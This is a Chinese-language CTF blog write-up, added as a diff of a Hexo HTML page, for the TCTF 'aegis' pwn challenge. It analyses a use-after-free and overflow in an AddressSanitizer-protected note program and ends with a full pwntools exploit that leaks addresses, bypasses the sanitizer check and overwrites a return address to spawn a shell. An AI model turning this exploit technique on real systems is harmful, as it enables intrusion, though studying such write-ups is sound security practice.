@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="题目很好值得学习一下">
+<meta name="keywords" content="ctf-pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCTF-aegis详解">
+<meta property="og:url" content="http://yoursite.com/2019/05/18/TCTF-aegis详解/index.html">
+<meta property="og:site_name" content="peanuts&#39;blog">
+<meta property="og:description" content="题目很好值得学习一下">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/image/2018TCTF/main.png">
+<meta property="og:image" content="http://yoursite.com/image/2018TCTF/add.png">
+<meta property="og:image" content="http://yoursite.com/image/2018TCTF/show.png">
+<meta property="og:image" content="http://yoursite.com/image/2018TCTF/updata.png">
+<meta property="og:image" content="http://yoursite.com/image/2018TCTF/delete.png">
+<meta property="og:image" content="http://yoursite.com/image/2018TCTF/secret.png">
+<meta property="og:image" content="http://yoursite.com/image/2018TCTF/error0.png">
+<meta property="og:image" content="http://yoursite.com/image/2018TCTF/heap.png">
+<meta property="og:image" content="http://yoursite.com/image/2018TCTF/pp.png">
+<meta property="og:image" content="http://yoursite.com/image/2018TCTF/check.png">
+<meta property="og:image" content="http://yoursite.com/image/2018TCTF/check0.png">
+<meta property="og:image" content="http://yoursite.com/image/2018TCTF/bin.jpeg">
+<meta property="og:updated_time" content="2019-05-18T00:44:22.441Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TCTF-aegis详解">
+<meta name="twitter:description" content="题目很好值得学习一下">
+<meta name="twitter:image" content="http://yoursite.com/image/2018TCTF/main.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2019/05/18/TCTF-aegis详解/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>TCTF-aegis详解 | peanuts'blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">peanuts'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-mylove">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/Mylove/" rel="section"><i class="menu-item-icon fa fa-fw fa-heart"></i> <br>Mylove</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/18/TCTF-aegis详解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="peanuts">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="peanuts'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">TCTF-aegis详解
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-05-18 08:36:30 / Modified: 08:44:22" itemprop="dateCreated datePublished" datetime="2019-05-18T08:36:30+08:00">2019-05-18</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>题目很好值得学习一下<br><a id="more"></a></p>
+<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>拿到题目仔细的分析能发现这是address sanitizer机制可以检测各种的错误，并且自己建立了一个malloc机制。所以glibc的那一套堆分配并没有作用。</p>
+<h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><p><img src="/image/2018TCTF/main.png" alt><br>实现一个菜单功能</p>
+<h5 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h5><p><img src="/image/2018TCTF/add.png" alt><br>先加入content然后加入id，地址是存在一个固定的地址，之后可以在动态调试的时候看的出来。同时可以计算出check的地址，也是不会更改的。</p>
+<h5 id="show-note"><a href="#show-note" class="headerlink" title="show_note"></a>show_note</h5><p><img src="/image/2018TCTF/show.png" alt><br>普通的一个show函数</p>
+<h5 id="update-note"><a href="#update-note" class="headerlink" title="update_note"></a>update_note</h5><p><img src="/image/2018TCTF/updata.png" alt><br>在此处有一个可能溢出的地方，但是由于会有checker一溢出就会造成crash，具体动态调试的时候可以发现。</p>
+<h5 id="delte-note"><a href="#delte-note" class="headerlink" title="delte_note"></a>delte_note</h5><p><img src="/image/2018TCTF/delete.png" alt><br>存在uaf，后面可能可以利用，直接的利用是不存的会被一只checker</p>
+<h5 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h5><p><img src="/image/2018TCTF/secret.png" alt><br>可以任意地址写0，但是只能写一次0，我猜是吧某个checker改为0然后进行一个利用。</p>
+<h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>这个题目还是要靠多动态分析才能出来，首先来几个text看看checker的报错</p>
+<h4 id="error"><a href="#error" class="headerlink" title="error"></a>error</h4><p><img src="/image/2018TCTF/error0.png" alt><br>这是heap use after free后的结果，看的出他check的位置，同时看报错能发现写入00可以绕过checkser。同时溢出也会报错。</p>
+<h5 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h5><p><img src="/image/2018TCTF/heap.png" alt><br>地址与分布，并且不会改变，从这里可以看出heap储存的规律大概是一个heap，然后一个索引的heap指针，那么如果我们能控制指针指向说不定能做很多事情。</p>
+<h5 id="思路part1"><a href="#思路part1" class="headerlink" title="思路part1"></a>思路part1</h5><p>有一定思路后开始进行尝试，首先调试heap and checker 让其能制造一些可用的溢出来。</p>
+<p>一、由逆向可知每次updata会检查cfi_check函数，然后根据heap记录的大小来进行输入，如果我们可以进行一个overflow去写一个0就能做出更大的溢出接下里尝试一下。</p>
+<h4 id="overheap-sucess"><a href="#overheap-sucess" class="headerlink" title="overheap_sucess"></a>overheap_sucess</h4><p>这里就不具体写了，需要读者自己去调试，找到合适的size去改写，然后制造一个pointer to leak,最后的效果是达到一个指针指向heap就可以造成leak了。<br><img src="/image/2018TCTF/pp.png" alt></p>
+<h4 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h4><p>可以做到leak，我们能得到的programmer base address和libc base address这时候发现给了libc赶紧吧one_gadget算出来先。再去思考应该写哪里。</p>
+<h6 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h6><p>会发现尝试写一个malloc-hook（内置的机制非glibc）会有报错，跟进报错的函数,会检查一个指针是否完好，不完好就会执行<br><img src="/image/2018TCTF/check.png" alt></p>
+<h6 id="点"><a href="#点" class="headerlink" title="点"></a>点</h6><p><img src="/image/2018TCTF/check0.png" alt><br>这里可以发现会调用一个函数，这个函数在跟进去能发现会有一个call rax，溯源rax的位置是否能被利用。发现他是在bss段是可进行更改的一个值，于是明确了改的思路。</p>
+<h6 id="坑2"><a href="#坑2" class="headerlink" title="坑2"></a>坑2</h6><p><img src="/image/2018TCTF/bin.jpeg" alt><br>直接写one发现是不可行的，只能继续想，发现其他函数还是可以的，结果发现rdi在栈上想可能可以利用栈溢出进行一个利用。</p>
+<h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><p>最后发现是可利用的，改写栈上的ret地址就可以达到一个getshell的作用。关于等下exp上的’\x00’*0x100是为达到清空栈满足onegadget条件</p>
+<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug=1</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p=process(&apos;./aegis&apos;,env=&#123;&apos;LD_PRELOAD&apos;:&apos;./libc-2.27.so&apos;&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">else:</span><br><span class="line">    p=remote(&apos;111.186.63.209&apos;,6666)</span><br><span class="line"></span><br><span class="line">def get(x):</span><br><span class="line">    return p.recvuntil(x)</span><br><span class="line">    </span><br><span class="line">def pu(x):</span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line">def pu_enter(x):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">def add(sz,content,id):</span><br><span class="line">    pu_enter(&apos;1&apos;)</span><br><span class="line">    get(&apos;Size&apos;)</span><br><span class="line">    pu_enter(str(sz))</span><br><span class="line">    get(&apos;Content&apos;)</span><br><span class="line">    pu(content)</span><br><span class="line">    get(&apos;ID&apos;)</span><br><span class="line">    pu_enter(str(id))</span><br><span class="line">    get(&apos;Choice: &apos;)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    pu_enter(&apos;2&apos;)</span><br><span class="line">    get(&apos;Index&apos;)</span><br><span class="line">    pu_enter(str(idx))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def update(idx,content,id):</span><br><span class="line">    pu_enter(&apos;3&apos;)</span><br><span class="line">    get(&apos;Index&apos;)</span><br><span class="line">    pu_enter(str(idx))</span><br><span class="line">    get(&apos;Content: &apos;)</span><br><span class="line">    pu(content)</span><br><span class="line">    get(&apos;New ID:&apos;)</span><br><span class="line">    pu_enter(str(id))</span><br><span class="line">    get(&apos;Choice:&apos; )</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    pu_enter(&apos;4&apos;)</span><br><span class="line">    get(&apos;Index&apos;)</span><br><span class="line">    pu_enter(str(idx))</span><br><span class="line">    get(&apos;Choice:&apos;)</span><br><span class="line"></span><br><span class="line">def secret(addr):</span><br><span class="line">    pu_enter(&apos;666&apos;)</span><br><span class="line">    get(&apos;Lucky Number: &apos;)</span><br><span class="line">    pu_enter(str(addr))</span><br><span class="line">    get(&apos;Choice:&apos;)</span><br><span class="line"></span><br><span class="line">add(0x10,&apos;a&apos;*8,0x123456789abcdef)</span><br><span class="line">for i in range(4):</span><br><span class="line">    add(0x10,&apos;b&apos;*0x8,123)</span><br><span class="line"></span><br><span class="line">#0x602000000000</span><br><span class="line">#0x7fff8000</span><br><span class="line"></span><br><span class="line">secret(0xc047fff8008-4)</span><br><span class="line">update(0,&apos;\x02&apos;*0x12,0x111111111)</span><br><span class="line">update(0,&apos;\x02&apos;*0x10+p64(0x02ffffff00000002)[:7],0x01f000ff1002ff)</span><br><span class="line">delete(0)</span><br><span class="line">#raw_input(&quot;#&quot;)</span><br><span class="line">add(0x10,p64(0x602000000018),0)</span><br><span class="line">#raw_input(&quot;#&quot;)</span><br><span class="line">show(0)</span><br><span class="line"></span><br><span class="line">get(&apos;Content: &apos;)</span><br><span class="line">addr = u64(get(&apos;\n&apos;)[:-1]+&apos;\x00\x00&apos;)</span><br><span class="line">print addr</span><br><span class="line">pbase = addr -0x114AB0</span><br><span class="line">get(&apos;Choice: &apos;)</span><br><span class="line"></span><br><span class="line">update(5,p64(pbase+0x347DF0)[:2],(pbase+0x347DF0)&gt;&gt;8)</span><br><span class="line">show(0)</span><br><span class="line"></span><br><span class="line">get(&apos;Content: &apos;)</span><br><span class="line">addr = u64(get(&apos;\n&apos;)[:-1]+&apos;\x00\x00&apos;)</span><br><span class="line">base = addr -0xE4FA0</span><br><span class="line">get(&apos;Choice: &apos;)</span><br><span class="line"></span><br><span class="line">update(5,p64(pbase+0x0FB08A0),p64(pbase+0x7AE140))</span><br><span class="line">#update(5,p64(pbase+0xfb08a0+0x28),(pbase+0xfb08a0+0x28)&gt;&gt;8)</span><br><span class="line">raw_input(&quot;aa&quot;)</span><br><span class="line">pu_enter(&apos;3&apos;)</span><br><span class="line">get(&apos;Index&apos;)</span><br><span class="line">pu_enter(&apos;0&apos;)</span><br><span class="line">get(&apos;Content&apos;)</span><br><span class="line">#raw_input(hex(pbase+0x7AE140))</span><br><span class="line">pu(p64(base+524464)[:7])</span><br><span class="line">#get(&apos;ID&apos;)</span><br><span class="line">raw_input(&quot;#get&quot;+str(hex(pbase+0x7AE140)))</span><br><span class="line">payload = &apos;a&apos;*471+p64(base+0x4f322)+&apos;\x00&apos;*0x100</span><br><span class="line">#raw_input(hex(base + 0x4f322))</span><br><span class="line">pu_enter(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>####总结<br>题目难的真实。。。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf-pwn/" rel="tag"># ctf-pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/16/kernel/" rel="next" title="kernel">
+                <i class="fa fa-chevron-left"></i> kernel
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80NDI3My8yMDgwNQ=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/touxiang.JPG" alt="peanuts">
+            
+              <p class="site-author-name" itemprop="name">peanuts</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">2</span>
+                    <span class="site-state-item-name">tags</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#静态分析"><span class="nav-number">1.</span> <span class="nav-text">静态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#main"><span class="nav-number">1.0.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#add-note"><span class="nav-number">1.0.2.</span> <span class="nav-text">add_note</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#show-note"><span class="nav-number">1.0.3.</span> <span class="nav-text">show_note</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#update-note"><span class="nav-number">1.0.4.</span> <span class="nav-text">update_note</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#delte-note"><span class="nav-number">1.0.5.</span> <span class="nav-text">delte_note</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#secret"><span class="nav-number">1.0.6.</span> <span class="nav-text">secret</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#动态分析"><span class="nav-number">2.</span> <span class="nav-text">动态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#error"><span class="nav-number">2.1.</span> <span class="nav-text">error</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#heap"><span class="nav-number">2.1.1.</span> <span class="nav-text">heap</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#思路part1"><span class="nav-number">2.1.2.</span> <span class="nav-text">思路part1</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#overheap-sucess"><span class="nav-number">2.2.</span> <span class="nav-text">overheap_sucess</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#part2"><span class="nav-number">2.3.</span> <span class="nav-text">part2</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#坑1"><span class="nav-number">2.3.0.1.</span> <span class="nav-text">坑1</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#点"><span class="nav-number">2.3.0.2.</span> <span class="nav-text">点</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#坑2"><span class="nav-number">2.3.0.3.</span> <span class="nav-text">坑2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#final"><span class="nav-number">3.</span> <span class="nav-text">final</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#exp："><span class="nav-number">3.0.1.</span> <span class="nav-text">exp：</span></a></li></ol></li></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">peanuts</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script>
+  window.livereOptions = {
+    refer: '2019/05/18/TCTF-aegis详解/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
